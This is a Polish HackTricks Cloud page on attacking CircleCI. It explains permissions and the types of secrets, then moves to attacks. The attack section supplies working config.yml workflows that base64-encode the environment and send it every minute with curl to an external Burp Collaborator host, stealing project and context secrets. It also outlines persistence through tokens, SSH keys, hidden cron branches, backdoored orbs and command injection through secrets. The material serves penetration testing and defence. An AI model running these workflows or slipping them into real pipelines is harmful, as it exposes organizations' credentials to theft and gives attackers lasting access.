# Bezpieczeństwo CircleCI

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) to platforma Continuous Integration, w której można **definiować szablony**, określając, co chcesz, aby zrobiła z kodem i kiedy to zrobić. W ten sposób można **automatyzować testowanie** lub **wdrożenia** bezpośrednio **z gałęzi głównej repozytorium**, na przykład.

## Uprawnienia

**CircleCI** **dziedziczy uprawnienia** związane z kontem github i bitbucket, które się zalogowało.\
W moich testach sprawdziłem, że o ile masz **uprawnienia do zapisu w repozytorium na githubie**, będziesz mógł **zarządzać ustawieniami projektu w CircleCI** (ustawiać nowe klucze ssh, pobierać klucze api projektu, tworzyć nowe gałęzie z nowymi konfiguracjami CircleCI...).

Jednak musisz być **administratorem repozytorium**, aby **przekształcić je w projekt CircleCI**.

## Zmienne środowiskowe i tajemnice

Zgodnie z [**dokumentacją**](https://circleci.com/docs/2.0/env-vars/) istnieje kilka sposobów **ładowania wartości do zmiennych środowiskowych** w ramach przepływu pracy.

### Wbudowane zmienne środowiskowe

Każdy kontener uruchomiony przez CircleCI będzie zawsze miał [**określone zmienne środowiskowe zdefiniowane w dokumentacji**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables), takie jak `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` lub `CIRCLE_USERNAME`.

### Tekst jawny

Możesz je zadeklarować w postaci tekstu jawnego wewnątrz **polecenia**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Możesz je zadeklarować w postaci tekstu jawnego w **środowisku uruchomieniowym**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Możesz je zadeklarować w postaci tekstu jawnego w **środowisku build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Możesz je zadeklarować w postaci tekstu jawnego w **środowisku kontenera**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Tajemnice projektu

Są to **tajemnice**, które będą dostępne tylko dla **projektu** (dla **dowolnej gałęzi**).\
Można je zobaczyć zadeklarowane w _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
Funkcjonalność "**Importuj zmienne**" pozwala na **importowanie zmiennych z innych projektów** do tego.
{% endhint %}

### Tajemnice kontekstu

Są to tajemnice, które są **dostępne dla całej organizacji**. Domyślnie **dowolne repozytorium** będzie miało dostęp do dowolnej tajemnicy przechowywanej tutaj:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Należy jednak zauważyć, że można **wybrać inną grupę** (zamiast Wszyscy członkowie), aby udostępnić tajemnice tylko określonym osobom.\
Jest to obecnie jedna z najlepszych metod **zwiększenia bezpieczeństwa tajemnic**, aby nie pozwalać wszystkim na dostęp do nich, ale tylko niektórym osobom.
{% endhint %}

## Ataki

### Wyszukiwanie jawnych tajemnic

Jeśli masz **dostęp do VCS** (np. github), sprawdź plik `.circleci/config.yml` **każdego repozytorium na każdej gałęzi** i **wyszukaj** potencjalne **jawne tajemnice** przechowywane tam.

### Wyliczanie zmiennych środowiskowych i kontekstu

Sprawdzając kod, można znaleźć **wszystkie nazwy tajemnic**, które są **używane** w każdym pliku `.circleci/config.yml`. Można również uzyskać **nazwy kontekstów** z tych plików lub sprawdzić je w konsoli internetowej: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Wyciek tajemnic projektu

{% hint style="warning" %}
Aby **wyciec WSZYSTKIE** tajemnice projektu i kontekstu, wystarczy mieć **dostęp do ZAPISU** tylko do **jednego repozytorium** w całej organizacji github (_i twoje konto musi mieć dostęp do kontekstów, ale domyślnie każdy ma dostęp do każdego kontekstu_).
{% endhint %}

{% hint style="danger" %}
Funkcjonalność "**Importuj zmienne**" pozwala na **importowanie zmiennych z innych projektów** do tego. Dlatego atakujący mógłby **zaimportować wszystkie zmienne projektu z wszystkich repozytoriów**, a następnie **wyciec wszystkie razem**.
{% endhint %}

Wszystkie tajemnice projektu zawsze są ustawiane w środowisku zadań, więc wystarczy wywołać env i zakodować je w base64, aby wyciec tajemnice w **konsoli dziennika prac przepływów**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Jeśli **nie masz dostępu do konsoli internetowej**, ale masz **dostęp do repozytorium** i wiesz, że jest używany CircleCI, możesz po prostu **utworzyć workflow**, który jest **uruchamiany co minutę** i **wysyła poufne dane na zewnętrzny adres**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Wyciekaj tajemnice kontekstu

Musisz **określić nazwę kontekstu** (to spowoduje również wyciek tajemnic projektu):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Jeśli **nie masz dostępu do konsoli internetowej**, ale masz **dostęp do repozytorium** i wiesz, że jest używany CircleCI, możesz po prostu **zmodyfikować workflow**, który jest **uruchamiany co minutę** i **wysyła poufne informacje na zewnętrzny adres**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Po prostu utworzenie nowego pliku `.circleci/config.yml` w repozytorium **nie wystarczy, aby uruchomić proces budowania w CircleCI**. Musisz **włączyć go jako projekt w konsoli CircleCI**.
{% endhint %}

### Ucieczka do chmury

**CircleCI** daje Ci możliwość uruchamiania **procesów budowania na ich maszynach lub na Twoich własnych**.\
Domyślnie ich maszyny znajdują się w GCP i początkowo nie będziesz w stanie znaleźć nic istotnego. Jednak jeśli ofiara uruchamia zadania na **własnych maszynach (potencjalnie w środowisku chmurowym)**, możesz znaleźć **punkt końcowy metadanych chmury z interesującymi informacjami**.

Zauważ, że w poprzednich przykładach wszystko było uruchamiane wewnątrz kontenera Docker, ale możesz również **poprosić o uruchomienie maszyny wirtualnej** (która może mieć inne uprawnienia chmury):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Lub nawet kontener Docker z dostępem do zdalnej usługi Docker:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Wytrwałość

* Możliwe jest **tworzenie tokenów użytkownika w CircleCI**, aby uzyskać dostęp do punktów końcowych API z uprawnieniami użytkownika.
* _https://app.circleci.com/settings/user/tokens_
* Możliwe jest **tworzenie tokenów projektów**, aby uzyskać dostęp do projektu z uprawnieniami przypisanymi do tokenu.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Możliwe jest **dodawanie kluczy SSH** do projektów.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Możliwe jest **tworzenie zadania cron w ukrytym branchu** w nieoczekiwanym projekcie, który **wycieka** wszystkie **zmienne środowiskowe kontekstu** codziennie.
* Lub nawet utworzenie w branchu / modyfikacja znanego zadania, które codziennie **wycieka** wszystkie zmienne kontekstu i **tajniki projektów**.
* Jeśli jesteś właścicielem GitHub, możesz **zezwolić na niezweryfikowane orby** i skonfigurować je w zadaniu jako **tylną furtkę**.
* Możesz znaleźć **podatność na wstrzyknięcie komend** w niektórym zadaniu i **wstrzyknąć komendy** za pomocą **tajnego** modyfikując jego wartość.

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
